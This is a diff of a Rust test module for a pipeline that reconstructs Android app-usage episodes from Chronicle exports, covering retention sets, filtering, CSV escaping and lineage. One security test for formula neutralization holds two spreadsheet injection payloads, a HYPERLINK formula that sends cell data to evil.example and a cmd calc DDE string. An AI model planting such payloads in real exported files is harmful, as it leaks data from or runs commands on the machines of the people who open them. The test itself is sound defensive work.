+                })
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            strip_label(&filtered),
+            strip_label(&unfiltered),
+            "excluding a package moved the any_app_* family",
+        );
+
+        // Pinned so a joint regression cannot pass by corrupting both runs.
+        // com.example.keep ends at 10:05 -- com.example.secret resuming is an
+        // other-app stop for it -- so secret's gap is zero and after's gap is
+        // 10:06 -> 10:20, i.e. 840 s = 0.2333... h.
+        assert_eq!(
+            strip_label(&filtered),
+            vec![
+                (
+                    "com.example.keep".into(),
+                    "1".into(),
+                    "1".into(),
+                    "0".into(),
+                    "0.0".into()
+                ),
+                (
+                    "com.example.secret".into(),
+                    "0".into(),
+                    "0".into(),
+                    "1".into(),
+                    "0.0".into()
+                ),
+                (
+                    "com.example.after".into(),
+                    "1".into(),
+                    "1".into(),
+                    "1".into(),
+                    "0.23333333333333334".into()
+                ),
+            ],
+        );
+    }
+
+    #[test]
+    fn filtered_unbounded_episode_keeps_pre_filter_raw_evidence_and_receipt_counts() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Secret,Activity Resumed,com.example.secret,2026-03-07 10:00:00,UTC\n",
+            "Study,P02,Child,Control,Activity Resumed,com.example.control,2026-03-07 10:00:00,UTC\n",
+        );
+        let filter_csv = b"app_package_name,known_application_labels\ncom.example.secret,Secret\n";
+        let mut filtered = test_options();
+        filtered.timezone = "UTC".into();
+        filtered.correct_duplicate_event_timestamps = false;
+        filtered.use_filter_file = true;
+        filtered.minimum_usage_duration = 0.0;
+        filtered.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+        filtered.micro_use_classification_policy_explicit = true;
+        let mut unfiltered = filtered.clone();
+        unfiltered.use_filter_file = false;
+
+        let filtered_result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &filtered,
+            PipelineV2SupportFiles {
+                filter_csv,
+                ..PipelineV2SupportFiles::default()
+            },
+        )
+        .expect("filtered unbounded run");
+        let unfiltered_result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &unfiltered,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("unfiltered unbounded control");
+
+        for result in [&filtered_result, &unfiltered_result] {
+            assert_eq!(
+                result
+                    .foundational_semantics_evidence
+                    .minimum_duration
+                    .unbounded_episode_count,
+                2,
+            );
+            assert_eq!(
+                result
+                    .foundational_semantics_evidence
+                    .micro_use
+                    .class_counts
+                    .get("not_classifiable"),
+                Some(&2),
+            );
+        }
+        assert_eq!(
+            filtered_result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .unbounded_episode_count,
+            unfiltered_result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .unbounded_episode_count,
+            "public package filtering must not erase immutable unbounded evidence",
+        );
+        let rows = parse_csv_to_records_with_physical_rows(&filtered_result.app_csv_bytes.to_vec());
+        let secret = rows
+            .iter()
+            .find(|(_, row)| row["app_package_name"] == "com.example.secret")
+            .expect("filtered missing-stop carrier row");
+        assert_eq!(secret.1["start_timestamp"], "");
+        assert_eq!(secret.1["micro_use_classification"], "not_classifiable");
+    }
+
+    /// Chronicle's two vendor spellings are aliases of the canonical type-1
+    /// event. B02 therefore owes exact output and receipt equivalence, not just
+    /// a unit assertion that normalization returns the same string.
+    #[test]
+    fn activity_resumed_aliases_are_end_to_end_equivalent_for_the_narrow_opener_arm() {
+        type EpisodeBounds = (Option<i64>, Option<i64>);
+        type AliasBaseline = (EpisodeBounds, PipelineV2Result);
+
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.minimum_usage_duration = 0.0;
+        options.correct_duplicate_event_timestamps = false;
+        options.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
+        options.opener_set = OpenerSet::ActivityResumedOnly;
+        options.materialize_visualization_data = true;
+
+        let mut baseline: Option<AliasBaseline> = None;
+        for spelling in [
+            "Move to Foreground",
+            "Unknown importance: 1",
+            ACTIVITY_RESUMED,
+        ] {
+            let csv = format!(
+                concat!(
+                    "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+                    "Study,P01,Target Child,Chat,{},com.example.chat,2026-03-07 10:00:00,UTC\n",
+                    "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:00,UTC\n",
+                ),
+                spelling,
+            );
+            let canonical = canonical_test_rows(csv.as_bytes(), "UTC");
+            assert_eq!(
+                canonical
+                    .iter()
+                    .map(|row| row.interaction_type.as_str())
+                    .collect::<Vec<_>>(),
+                vec![ACTIVITY_RESUMED, ACTIVITY_PAUSED],
+                "{spelling} did not normalize into the canonical lifecycle pair",
+            );
+            let retained = apply_event_retention(canonical, options.event_retention_set);
+            let (materialized, matched) =
+                match_and_materialize_activity_resumed_only(retained, &BTreeSet::new(), &options);
+            let start = materialized
+                .iter()
+                .find(|row| row.start_timestamp_ns.is_some())
+                .expect("the normalized opener materializes");
+            let bounds = (start.start_timestamp_ns, start.stop_timestamp_ns);
+            assert_eq!(
+                matched.opener_set_evidence.applicability,
+                OpenerSetApplicability {
+                    requested: OpenerSet::ActivityResumedOnly,
+                    effective: Some(OpenerSet::ActivityResumedOnly),
+                    relation: OpenerStrategyRelation::BaselineEquivalent,
+                    refusal_reason: None,
+                },
+            );
+            assert_eq!(
+                matched.opener_set_evidence.selected_opener_type_counts,
+                BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 1)]),
+            );
+            assert_eq!(
+                matched.opener_set_evidence.materialized_opener_type_counts,
+                BTreeMap::from([(ACTIVITY_RESUMED.to_string(), 1)]),
+            );
+
+            let classified = incremental::classify_episode_durations(
+                materialized,
+                &BTreeSet::new(),
+                options.micro_use_classification_policy,
+                options.minimum_usage_duration,
+                options.minimum_duration_comparator,
+                options.minimum_duration_disposition,
+                &matched.selected_nonresume_closed_indices,
+                &b06::MaximumDurationRowStage::omitted(),
+            )
+            .expect("classification with the omitted B06 shape never refuses");
+            let episode = classified
+                .iter()
+                .find(|row| row.interaction_type == APP_USAGE)
+                .expect("the normalized pair becomes scientific app usage");
+            assert_eq!(episode.duration_seconds, Some(60.0));
+            assert_eq!(
+                (episode.start_timestamp_ns, episode.stop_timestamp_ns),
+                bounds,
+            );
+
+            let result = run_pipeline_v2_with_supports(
+                csv.as_bytes(),
+                &options,
+                PipelineV2SupportFiles::default(),
+            )
+            .unwrap_or_else(|error| panic!("{spelling} failed end to end: {error}"));
+            assert_eq!(result.app_row_count, 1);
+            assert_eq!(result.opener_set_evidence, matched.opener_set_evidence);
+
+            if let Some((baseline_bounds, baseline_result)) = &baseline {
+                assert_eq!(&bounds, baseline_bounds, "{spelling} changed bounds");
+                assert_eq!(
+                    result.app_csv_bytes, baseline_result.app_csv_bytes,
+                    "{spelling} changed the scientific app export",
+                );
+                assert_eq!(
+                    result.review_summary_json_bytes, baseline_result.review_summary_json_bytes,
+                    "{spelling} changed the review summary",
+                );
+                assert_eq!(
+                    result.visualization_data_json_bytes,
+                    baseline_result.visualization_data_json_bytes,
+                    "{spelling} changed visualization data",
+                );
+                assert_eq!(
+                    result.row_lineage, baseline_result.row_lineage,
+                    "{spelling} changed scientific source-row lineage",
+                );
+                assert_eq!(
+                    result.opener_set_evidence, baseline_result.opener_set_evidence,
+                    "{spelling} changed the effective B02 receipt",
+                );
+            } else {
+                baseline = Some((bounds, result));
+            }
+        }
+    }
+
+    /// Parry & Toth do not retain type 2. This is the whole reason the axis
+    /// exists separately from the reconstruction arm: the arm ports the
+    /// Chronicle adaptation, which DOES close on a same-package Activity
+    /// Paused, and the paper's own retained set does not contain that row at
+    /// all. If this assertion ever flips, the two stop being distinguishable
+    /// and the multiverse loses the comparison it was built to make.
+    #[test]
+    fn parry_toth_retains_the_screen_and_device_types_but_not_activity_paused() {
+        let set = EventRetentionSet::ParryToth;
+        for kept in [
+            "Activity Resumed",
+            "Filtered App Resumed",
+            "Screen Interactive",
+            "Screen Non-Interactive",
+            "Keyguard Shown",
+            "Keyguard Hidden",
+            "Device Shutdown",
+            "Device Startup",
+        ] {
+            assert!(set.retains(kept), "{kept} is in types 1/15/16/17/18/26/27");
+        }
+        for dropped in ["Activity Paused", "Filtered App Paused", "User Interaction"] {
+            assert!(!set.retains(dropped), "{dropped} is not in their set");
+        }
+    }
+
+    /// The Usage Logger set is the only one that keeps type 7, and the only
+    /// reason `User Interaction` is worth reading from a Chronicle export.
+    #[test]
+    fn only_the_usage_logger_set_keeps_user_interaction() {
+        for set in EventRetentionSet::ALL {
+            let expected = matches!(
+                set,
+                EventRetentionSet::None | EventRetentionSet::UsageLogger
+            );
+            assert_eq!(
+                set.retains("User Interaction"),
+                expected,
+                "{} disagrees about type 7",
+                set.canonical_id()
+            );
+        }
+    }
+
+    /// Every published set retains the event that OPENS an episode. The event
+    /// that closes it is not universal, which is the whole reason these sets
+    /// are a separate axis rather than a detail of the reconstruction rule.
+    #[test]
+    fn every_set_retains_the_episode_opening_event() {
+        for set in EventRetentionSet::ALL {
+            assert!(
+                set.retains("Activity Resumed"),
+                "{} drops Activity Resumed, which no published rule does",
+                set.canonical_id()
+            );
+        }
+        // Parry & Toth are the one exception on the closing half, and they are
+        // the reason this is asserted per-label rather than as a blanket claim.
+        assert!(!EventRetentionSet::ParryToth.retains("Activity Paused"));
+        for set in [
+            EventRetentionSet::None,
+            EventRetentionSet::UsageLogger,
+            EventRetentionSet::TothTrifonova,
+            EventRetentionSet::ForegroundBackgroundOnly,
+        ] {
+            assert!(set.retains("Activity Paused"), "{}", set.canonical_id());
+        }
+    }
+
+    /// The default retains everything and allocates nothing, which is what makes
+    /// the axis additive: with it unset, every golden is byte-identical.
+    #[test]
+    fn the_default_retention_set_keeps_every_row() {
+        let set = EventRetentionSet::default();
+        assert_eq!(set, EventRetentionSet::None);
+        for label in [
+            "Activity Resumed",
+            "Activity Paused",
+            "Notification Seen",
+            "Configuration Change",
+            "Locus ID Set",
+            "Standby Bucket Changed",
+        ] {
+            assert!(set.retains(label), "the default must keep {label}");
+        }
+    }
+
+    #[test]
+    fn every_retention_set_round_trips_through_its_canonical_id() {
+        for set in EventRetentionSet::ALL {
+            assert_eq!(
+                EventRetentionSet::from_canonical_id(set.canonical_id()),
+                set,
+                "{} does not round-trip",
+                set.canonical_id()
+            );
+        }
+        // An unknown value is refused rather than read as any set.
+        assert!(
+            EventRetentionSet::parse_request_value("parry_toth_8")
+                .expect_err("an unknown event_retention_set is refused")
+                .starts_with("unknown_event_retention_set: "),
+        );
+    }
+
+    /// The permissible values an ontology enum declares.
+    ///
+    /// The values are the six-space-indented keys under `permissible_values:`,
+    /// and the block ends at the first line indented less than that.
+    fn ontology_permissible_values<'a>(ontology: &'a str, enum_name: &str) -> Vec<&'a str> {
+        let block = ontology
+            .split_once(&format!("  {enum_name}:"))
+            .unwrap_or_else(|| panic!("the ontology declares {enum_name}"))
+            .1
+            .split_once("    permissible_values:")
+            .unwrap_or_else(|| panic!("{enum_name} declares permissible values"))
+            .1;
+        block
+            .lines()
+            .skip(1)
+            .take_while(|line| line.starts_with("      ") || line.trim().is_empty())
+            .filter_map(|line| line.trim().split_once(':').map(|(key, _)| key))
+            .collect()
+    }
+
+    /// Each axis enum's doc comment says its variants ARE the permissible values
+    /// of the matching research-ontology enum. That was a claim nothing checked,
+    /// and it went false the moment two arms were added to
+    /// `EpisodeReconstructionStrategy` without being added to the schema. Now
+    /// the claim is enforced in both directions, for every axis.
+    ///
+    /// Adding a fifth axis costs one row here. Before this was table-driven it
+    /// cost a whole new copy of this test, which is why the two newer axes had
+    /// no such test at all.
+    #[test]
+    fn every_axis_arm_is_declared_in_the_research_ontology() {
+        const ONTOLOGY: &str =
+            include_str!("../../../web/schema/chronicle-research-ontology.linkml.yaml");
+
+        let axes: [(&str, Vec<&'static str>); 5] = [
+            (
+                "EventRetentionSetId",
+                EventRetentionSet::ALL
+                    .iter()
+                    .map(|arm| arm.canonical_id())
+                    .collect(),
+            ),
+            (
+                "ReconstructionStrategyId",
+                EpisodeReconstructionStrategy::ALL
+                    .iter()
+                    .map(|arm| arm.canonical_id())
+                    .collect(),
+            ),
+            (
+                "OpenerSetId",
+                OpenerSet::ALL
+                    .iter()
+                    .map(|arm| arm.canonical_id())
+                    .collect(),
+            ),
+            (
+                "IntervalQualityPolicyId",
+                IntervalQualityPolicy::ALL
+                    .iter()
+                    .map(|arm| arm.canonical_id())
+                    .collect(),
+            ),
+            (
+                "SessionGroupingPolicyId",
+                SessionGroupingPolicy::ALL
+                    .iter()
+                    .map(|arm| arm.canonical_id())
+                    .collect(),
+            ),
+        ];
+
+        for (enum_name, implemented) in axes {
+            let declared = ontology_permissible_values(ONTOLOGY, enum_name);
+            for arm in &implemented {
+                assert!(
+                    declared.contains(arm),
+                    "{arm} is implemented but is not a {enum_name} permissible \
+                     value; declared: {declared:?}"
+                );
+            }
+            for value in &declared {
+                assert!(
+                    implemented.contains(value),
+                    "the ontology declares {value} under {enum_name}, which no \
+                     arm implements"
+                );
+            }
+        }
+    }
 
     /// Both hash sinks batch small writes so per-call overhead cannot dominate.
     /// Batching is only allowed to change *where* the byte stream is split
@@ -8027,6 +3899,104 @@ mod tests {
         }
     }
 
+    /// Security X4: the participant-id writer behind the compliance and
+    /// day-coverage CSVs quoted `,` `"` `\n` but not a bare `\r`, so one id
+    /// carrying a CR split its row in Excel and in Python's `csv` reader.
+    #[test]
+    fn the_participant_id_writer_quotes_a_bare_carriage_return() {
+        assert_eq!(csv_escape_value("P1\rX"), "\"P1\rX\"");
+        assert_eq!(csv_escape_value("P1\r\nX"), "\"P1\r\nX\"");
+        assert_eq!(csv_escape_value("P1"), "P1");
+        assert_eq!(csv_escape_value("P,1"), "\"P,1\"");
+        assert_eq!(csv_escape_value("say \"hi\""), "\"say \"\"hi\"\"\"");
+        let record = format!("{},2026-03-07,usage\n", csv_escape_value("P1\rX"));
+        let rows: Vec<Vec<String>> = csv::ReaderBuilder::new()
+            .has_headers(false)
+            .from_reader(record.as_bytes())
+            .records()
+            .map(|row| row.expect("one record").iter().map(str::to_string).collect())
+            .collect();
+        assert_eq!(rows, [["P1\rX", "2026-03-07", "usage"]]);
+    }
+
+    /// Security X3, the cell rule itself: a text cell that a spreadsheet would
+    /// evaluate gains one leading `'`; a numeric cell, any other text cell and
+    /// every separator keep their exact bytes.
+    #[test]
+    fn spreadsheet_formula_neutralization_prefixes_text_cells_only() {
+        let cases: &[(&str, &str)] = &[
+            // The two payloads the launch-audit probe pushed through the app.
+            (
+                "label,\"=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1;\"\"click\"\")\"\n",
+                "label,\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1;\"\"click\"\")\"\n",
+            ),
+            ("label,+cmd|'/c calc'!A0\n", "label,'+cmd|'/c calc'!A0\n"),
+            // Every trigger, unquoted.
+            ("=1+1,@SUM(A1),\tx,-x,+x\n", "'=1+1,'@SUM(A1),'\tx,'-x,'+x\n"),
+            // Numbers are numbers, not formulas: untouched.
+            (
+                "-5,+5,-1.5,-.5,-5.,+1.5e3,-2E-7,-0,-Infinity,+Infinity,7,0.25\n",
+                "-5,+5,-1.5,-.5,-5.,+1.5e3,-2E-7,-0,-Infinity,+Infinity,7,0.25\n",
+            ),
+            // Signed text that only starts like a number.
+            (
+                "-,--,-1-2,-1e,-e5,-.,-Inf,-Infinityx,-1x,+1 2\n",
+                "'-,'--,'-1-2,'-1e,'-e5,'-.,'-Inf,'-Infinityx,'-1x,'+1 2\n",
+            ),
+            // A quoted cell is always text; its first content byte decides.
+            (
+                "\"-5,3\",\"=a,b\",\"\r=x\",\"\"\"=q\"\"\",\"a,=b\",\"\"\n",
+                "\"'-5,3\",\"'=a,b\",\"'\r=x\",\"\"\"=q\"\"\",\"a,=b\",\"\"\n",
+            ),
+            // Not at the start of a cell: untouched. Dates and ids stay put.
+            ("a=b,x-1,2026-03-07,com.example.chat,\n", "a=b,x-1,2026-03-07,com.example.chat,\n"),
+            // CRLF terminators and a final record with no newline.
+            ("x,-5\r\n=y,\r\n-z", "x,-5\r\n'=y,\r\n'-z"),
+            ("a,-5", "a,-5"),
+            ("", ""),
+        ];
+        for (input, expected) in cases {
+            let whole = output::neutralize_spreadsheet_formulas(input.as_bytes());
+            assert_eq!(
+                String::from_utf8(whole.clone()).expect("UTF-8"),
+                *expected,
+                "neutralizing {input:?}",
+            );
+            // The filter streams: one byte at a time gives the same bytes as
+            // one write, so a payload-chunk boundary cannot change a cell.
+            let mut filter = output::SpreadsheetFormulaNeutralizer::new(Vec::new());
+            for byte in input.as_bytes() {
+                std::io::Write::write_all(&mut filter, std::slice::from_ref(byte))
+                    .expect("Vec writer");
+            }
+            assert_eq!(filter.finish().expect("Vec writer"), whole, "chunked {input:?}");
+            // A neutralized cell starts with `'`, so a second pass is a no-op.
+            assert_eq!(output::neutralize_spreadsheet_formulas(&whole), whole);
+        }
+
+        // Decoded by a real CSV reader, every cell is the original or `'`
+        // followed by the original, and the record shape never changes.
+        let original = "p,\"=HYPERLINK(\"\"x\"\")\",-12.5,\"a,b\",-x\n=q,1,-0.5,@y,\"\r\"\n";
+        let decode = |bytes: &[u8]| -> Vec<Vec<String>> {
+            csv::ReaderBuilder::new()
+                .has_headers(false)
+                .from_reader(bytes)
+                .records()
+                .map(|row| row.expect("record").iter().map(str::to_string).collect())
+                .collect()
+        };
+        let before = decode(original.as_bytes());
+        let after = decode(&output::neutralize_spreadsheet_formulas(original.as_bytes()));
+        assert_eq!(
+            after,
+            [
+                ["p", "'=HYPERLINK(\"x\")", "-12.5", "a,b", "'-x"],
+                ["'=q", "1", "-0.5", "'@y", "'\r"],
+            ]
+        );
+        assert_eq!(before.len(), after.len());
+    }
+
     /// JS `parseFloat(value.toPrecision(n))` returns the input unchanged for
     /// the non-finite and zero cases, including the sign of a negative zero —
     /// which the CSV writer would otherwise render as `-0` instead of `0`.
@@ -8120,6 +4090,29 @@ mod tests {
         )
         .unwrap_err()
         .contains("before it starts"));
+        assert!(validate_support_csv(
+            "call_sms_eligibility_file",
+            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,1\nP02,call,unavailable,,\nP03,call,available,,\n",
+        )
+        .is_ok());
+        assert!(validate_support_csv(
+            "call_sms_eligibility_file",
+            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,0\n",
+        )
+        .unwrap_err()
+        .contains("require positive integer"));
+        assert!(validate_support_csv(
+            "call_sms_eligibility_file",
+            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call,unavailable,0,1\n",
+        )
+        .unwrap_err()
+        .contains("require blank"));
+        assert!(validate_support_csv(
+            "call_sms_eligibility_file",
+            b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call,available,,\nP01,call,unavailable,,\n",
+        )
+        .unwrap_err()
+        .contains("duplicate participant_id and modality_scope"));
     }
 
     #[test]
@@ -8176,6 +4169,36 @@ mod tests {
                 b"participant_id,device_count\nP01,1\n",
                 b"participant_id\nP01\n",
                 "missing required column(s) device_count",
+            ),
+            (
+                "analysis_feature_matrix_file",
+                b"participant_id,feature_id,value,missing_state,feature_set_id\nP01,screen_time::week_01,1,observed,phone_usage\n",
+                b"participant_id,feature_id,value,missing_state\nP01,screen_time::week_01,1,observed\n",
+                "missing required column(s) feature_set_id",
+            ),
+            (
+                "call_sms_eligibility_file",
+                b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator,year_equivalent_exposure_denominator\nP01,call_text_combined,available,299,1\nP02,call,unavailable,,\n",
+                b"participant_id,modality_scope,availability_state,year_equivalent_exposure_numerator\nP01,call_text_combined,available,299\n",
+                "missing required column(s) year_equivalent_exposure_denominator",
+            ),
+            (
+                "phonestudy_ps_communication_file",
+                b"id,contact_hash\nc-1,peer-a\n",
+                b"communication_id,contact_hash\nc-1,peer-a\n",
+                "missing required column(s) id",
+            ),
+            (
+                "phonestudy_es_file",
+                b"user_id,es_questionnaire_id\nu-1,es-1\n",
+                b"participant_id,questionnaire_id\nu-1,es-1\n",
+                "missing required column(s) user_id, es_questionnaire_id",
+            ),
+            (
+                "anchor_events_file",
+                b"participant_id,anchor_timestamp\nu-1,2026-01-01 12:00:00\n",
+                b"participant_id,event_timestamp\nu-1,2026-01-01 12:00:00\n",
+                "missing required column(s) anchor_timestamp",
             ),
         ];
         for (role, accepted, rejected, expected_error) in cases {
@@ -8352,6 +4375,21 @@ mod tests {
         // be in place before the prefix is trusted.
         assert!(normalize_support_date("2026-03/07").is_err());
         assert!(normalize_support_date("2026/03-07").is_err());
+        for impossible in ["2026-02-29", "2/29/2026"] {
+            assert_eq!(
+                normalize_support_date(impossible).expect_err("impossible calendar date"),
+                "unparseable date value",
+            );
+        }
+        // Byte 10 of this cell is inside a character; it is refused, not a
+        // panic. A two-digit year, month 13 and day 0 are refused rather than
+        // becoming a window no row can fall in.
+        for value in ["2026\u{5e74}01\u{6708}05\u{65e5}", "1/5/26", "13/5/2026", "1/0/2026", "2026-13-01", "abcd-ef-gh"] {
+            assert_eq!(
+                normalize_support_date(value).expect_err("not a date"),
+                "unparseable date value"
+            );
+        }
         // A slash date needs all three parts, and none of the errors may echo
         // the cell.
         for value in ["03/07", "03/07/2026/01", "March 7 2026", ""] {
@@ -8368,17 +4406,24 @@ mod tests {
         assert_eq!(numerical_id("ab12cd"), None);
         assert_eq!(numerical_id("ab12"), None);
         assert_eq!(numerical_id("no digits"), None);
+        assert_eq!(
+            matching_study_participant_id("TECH-1042-D2", ["1042", "TECH-1042-D2"].into_iter(),),
+            Some("TECH-1042-D2"),
+            "an exact candidate wins even when a numerical alias appears first",
+        );
 
         let windows = vec![
             StudyWindow {
                 participant_id: "1042".to_string(),
                 start_date: "2026-03-01".to_string(),
                 end_date: "2026-03-31".to_string(),
+                exclusions: Vec::new(),
             },
             StudyWindow {
                 participant_id: "TECH-2001-D1".to_string(),
                 start_date: "2026-04-01".to_string(),
                 end_date: "2026-04-30".to_string(),
+                exclusions: Vec::new(),
             },
         ];
         assert_eq!(
@@ -8448,10 +4493,16 @@ mod tests {
                 ",Orphan\n",
             )
             .as_bytes(),
+            PackageExclusionPreset::AllSuppliedRows,
+            FilterMatchField::AppPackageName,
         );
-        assert_eq!(parsed.len(), 2, "a blank package must not create an entry");
         assert_eq!(
-            parsed["com.example.chat"]
+            parsed.packages.len(),
+            2,
+            "a blank package must not create an entry"
+        );
+        assert_eq!(
+            parsed.packages["com.example.chat"]
                 .iter()
                 .cloned()
                 .collect::<BTreeSet<_>>(),
@@ -8459,7 +4510,7 @@ mod tests {
             "each listed label is trimmed and kept; empty segments are dropped",
         );
         assert!(
-            parsed["com.example.any"].is_empty(),
+            parsed.packages["com.example.any"].is_empty(),
             "an empty label list means the package matches every label",
         );
     }
@@ -8468,8 +4519,11 @@ mod tests {
     fn filter_relabeling_respects_the_label_scope_and_the_stop_event_vocabulary() {
         // Same package, two labels: only the listed one may be relabeled, and
         // only the four session-bearing interaction types are rewritten.
-        let filter_map =
-            parse_filter_csv(b"app_package_name,known_application_labels\ncom.example.chat,Chat\n");
+        let filter_map = parse_filter_csv(
+            b"app_package_name,known_application_labels\ncom.example.chat,Chat\n",
+            PackageExclusionPreset::AllSuppliedRows,
+            FilterMatchField::AppPackageName,
+        );
         let rows = |interaction: &str, label: &str| {
             let csv = format!(
                 concat!(
@@ -8589,9 +4643,30 @@ mod tests {
         let long_label = "L".repeat(5_000);
         let csv =
             format!("app_package_name,known_application_labels\ncom.example.chat,{long_label}\n");
-        let parsed = parse_filter_csv(csv.as_bytes());
+        for (preset, refused) in [
+            (PackageExclusionPreset::AllSuppliedRows, false),
+            (PackageExclusionPreset::HonorFilterFlag, false),
+            (PackageExclusionPreset::SystemScopeOnly, true),
+        ] {
+            assert_eq!(
+                validate_filter_file_for_preset(b"app_package_name\ncom.example.chat\n", preset)
+                    .is_err(),
+                refused,
+                "{preset:?}"
+            );
+            validate_filter_file_for_preset(
+                b"app_package_name,app_filter_category\ncom.example.chat,system\n",
+                preset,
+            )
+            .expect("a file with the category column");
+        }
+        let parsed = parse_filter_csv(
+            csv.as_bytes(),
+            PackageExclusionPreset::AllSuppliedRows,
+            FilterMatchField::AppPackageName,
+        );
         assert_eq!(
-            parsed["com.example.chat"]
+            parsed.packages["com.example.chat"]
                 .iter()
                 .cloned()
                 .collect::<Vec<_>>(),
@@ -8643,6 +4718,40 @@ mod tests {
     /// truncated `application_label` here would silently rename an app in every
     /// output file.
     #[test]
+    fn supplied_sms_links_use_physical_artifact_rows_without_time_inference() {
+        let header = "participant_id,communication_modality,communication_direction,communication_peer_id,sms_response_to_source_row,communication_conversation_id,event_timestamp\n";
+        let valid = format!("{header}P,sms,received,peer,,conversation,opaque-later\n,,,,,,\nP,sms,sent,peer,1,conversation,opaque-earlier\n");
+        assert!(validate_supplied_communication_relationships(valid.as_bytes()).is_ok());
+        let unknown_peer = valid.replace("sent,peer,1", "sent,,1");
+        assert!(validate_supplied_communication_relationships(unknown_peer.as_bytes()).is_ok());
+        let other_person_same_token =
+            format!("{valid}Other,sms,received,other-peer,,conversation,unknown\n");
+        assert!(
+            validate_supplied_communication_relationships(other_person_same_token.as_bytes())
+                .is_ok()
+        );
+        for invalid in [
+            valid.replace("sent,peer,1", "sent,peer,2"), // all-empty physical row
+            valid.replace("sent,peer,1", "sent,peer,3"), // self
+            valid.replace("sent,peer,1", "sent,peer,9"), // absent
+            valid.replace("sent,peer,1", "sent,peer,1.0"),
+            valid.replace("sent,peer,1", "sent,peer,-1"),
+            valid.replace("sent,peer,1", "received,peer,1"),
+            valid.replace("P,sms,received", "Other,sms,received"),
+            valid.replace("P,sms,received", "P,call,received"),
+            valid.replace("P,sms,received", "P,sms,sent"),
+            valid.replace("sent,peer,1", "sent,other-peer,1"),
+            valid.replace(
+                "sent,peer,1,conversation",
+                "sent,peer,1,another-conversation",
+            ),
+            format!("{valid}P,sms,received,other-peer,,conversation,unknown\n"),
+        ] {
+            assert!(validate_supplied_communication_relationships(invalid.as_bytes()).is_err());
+        }
+    }
+
+    #[test]
     fn raw_export_parsing_survives_long_cells_ragged_rows_and_empty_input() {
         let long_label = "L".repeat(5_000);
         let quoted_long_label = format!("Chat, {}", "Q".repeat(5_000));
@@ -8692,6 +4801,16 @@ mod tests {
         assert_eq!(unterminated.len(), 1);
         assert_eq!(unterminated[0].participant_id, "P01");
         assert_eq!(unterminated[0].event_timestamp, "2026-03-07 10:00:00");
+
+        // Headers are matched the way raw inspection matches them: a
+        // byte-order mark and surrounding spaces must not hide a column.
+        let excel = incremental::decode_source_records(
+            "\u{feff}study_id, participant_id ,event_timestamp\nS1,P01,2026-03-07 10:00:00\n"
+                .as_bytes(),
+        );
+        assert_eq!(excel.len(), 1);
+        assert_eq!(excel[0].study_id, "S1");
+        assert_eq!(excel[0].participant_id, "P01");
     }
 
     #[test]
@@ -8903,6 +5022,93 @@ mod tests {
         ] {
             assert!(error.contains("a UTF-8 string"), "{error}");
         }
+    }
+
+    /// The payload store codes lineage with postcard through the stored
+    /// mirror. Every optional field, present or absent, and every search must
+    /// come back equal, and repeated strings must come back shared.
+    #[test]
+    fn stored_row_lineage_round_trips_every_field() {
+        let digest = LineageSearchDigest::parse(
+            "blake3:000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f",
+        )
+        .expect("parse a blake3 digest");
+        let output_kind = Arc::new("screen-csv".to_owned());
+        let terminal_query_group = Arc::new("outputs".to_owned());
+        let searched = PipelineRowLineage {
+            output_kind: Arc::clone(&output_kind),
+            output_row_index: 0,
+            source_data_row_ranges: vec![
+                SourceDataRowRange { first: 3, last: 5 },
+                SourceDataRowRange { first: 9, last: 9 },
+            ],
+            source_data_row_count: 4,
+            searches: vec![LineageSearchEvidence {
+                protocol_version: Arc::new("chronicle-lineage-search/v1".to_owned()),
+                reason: Arc::new("selected-qualifying-stop".to_owned()),
+                index_space: Arc::new("pipeline-event-order".to_owned()),
+                start_participant_id: Arc::new("participant-7".to_owned()),
+                start_event_index: 11,
+                end_event_index_exclusive: 42,
+                candidate_event_count: 3,
+                candidate_chain_digest: digest,
+            }],
+            terminal_query_group: Arc::clone(&terminal_query_group),
+            screen: Some(Box::new(ScreenIntervalLineage {
+                screen_interval_id: Some("screen-interval-1".to_owned()),
+                screen_construction_strategy_id: Some("strategy".to_owned()),
+                screen_interval_kind: Some("kind".to_owned()),
+                screen_interval_close_reason: Some("reason".to_owned()),
+                screen_interval_left_censored: Some(true),
+                screen_interval_right_censored: Some(false),
+                schoedel_completion: Some("complete".to_owned()),
+            })),
+        };
+        let bare = PipelineRowLineage {
+            output_kind: Arc::clone(&output_kind),
+            output_row_index: 1,
+            source_data_row_ranges: Vec::new(),
+            source_data_row_count: 0,
+            searches: Vec::new(),
+            terminal_query_group: Arc::clone(&terminal_query_group),
+            screen: None,
+        };
+        let rows = vec![searched, bare];
+
+        let bytes = with_serialized_row_string_table(|| encode_row_lineage_payload(&rows))
+            .expect("encode lineage");
+        let decoded = with_deserialized_row_string_pool(|| decode_row_lineage_payload(&bytes))
+            .expect("decode lineage");
+
+        assert_eq!(decoded, rows);
+        assert_eq!(decoded.capacity(), rows.len());
+        assert!(Arc::ptr_eq(&decoded[0].output_kind, &decoded[1].output_kind));
+        assert!(Arc::ptr_eq(&decoded[0].terminal_query_group, &decoded[1].terminal_query_group));
+
+        // The JSON wire is the seven optional members flattened into the row,
+        // present only when set, and a row without them reads back boxless.
+        let json = serde_json::to_string(&rows).expect("lineage JSON");
+        assert!(
